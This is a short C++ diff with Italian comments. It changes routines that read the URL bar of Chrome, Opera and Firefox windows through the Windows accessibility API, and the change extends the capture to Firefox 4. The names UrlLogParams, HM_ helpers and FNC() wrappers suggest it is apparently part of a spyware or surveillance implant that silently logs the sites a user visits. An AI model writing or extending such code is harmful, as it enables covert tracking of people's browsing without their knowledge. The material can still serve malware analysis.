@@ -391,9 +391,13 @@ BOOL CALLBACK URLEnumChildProc(HWND hwnd,LPARAM pUrlLogParams)
 				pServProv->Release();
 			}   
 			pAccessible->Release();
-		} 
-		return ret_val;
-	} else if ( wcscmp(buf, L"OpWindow")==0 || wcsncmp(buf, L"Chrome", wcslen(L"Chrome"))==0 ) {
+		}
+		// Se ha trovato un URL (firefox fino al 3) non continua a cercare
+		if (!ret_val)
+			return ret_val;
+	} 
+	// Per Chrome, Opera o Firefox4
+	if ( wcscmp(buf, L"OpWindow")==0 || wcsncmp(buf, L"Chrome", wcslen(L"Chrome"))==0 || wcscmp( buf, L"MozillaWindowClass" )==0) {
 		IAccessible *iAcc = NULL; 
 		m_url_found = FALSE; // Serve come semaforo per far fermare le funzioni ricorsive
 		hr = FNC(AccessibleObjectFromWindow)(hwnd, OBJID_WINDOW, IID_IAccessible,(void**)&iAcc); 
@@ -421,7 +425,9 @@ void GetURLBarContent(HWND hWnd, DWORD browser_type)
 	HM_SafeGetWindowTextW(UrlLogParams.browser_window, UrlLogParams.title, MAXURLTITLELEN);
 
 	CoInitialize( NULL );
-	FNC(EnumChildWindows)(hWnd, URLEnumChildProc, (LPARAM)&UrlLogParams); 
+	// Se non lo trova sulla finestra radice, allora cerca sui figli
+	if (URLEnumChildProc(hWnd, (LPARAM)&UrlLogParams))
+		FNC(EnumChildWindows)(hWnd, URLEnumChildProc, (LPARAM)&UrlLogParams); 
 	CoUninitialize();
 }			
 
